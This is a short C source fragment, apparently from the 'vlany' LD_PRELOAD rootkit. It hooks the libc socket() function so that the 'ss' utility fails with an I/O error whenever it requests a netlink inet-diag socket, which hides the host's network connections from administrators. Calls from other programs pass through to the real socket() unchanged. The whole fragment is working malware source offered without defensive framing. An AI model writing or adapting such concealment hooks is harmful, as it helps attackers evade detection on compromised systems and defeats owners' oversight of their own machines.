int socket(int domain, int type, int protocol)
{
    #ifdef DEBUG
        printf("[vlany] socket() called\n");
    #endif

    HOOK(old_socket, CSOCKET);

    if(domain == AF_NETLINK && type == SOCK_RAW && protocol == NETLINK_INET_DIAG)
    {
        if(!strcmp(procname_self(), "ss") || !strcmp(procname_self(), "/usr/sbin/ss")) { errno = EIO; return -1; }
    }

    return old_socket(domain,type,protocol);
}
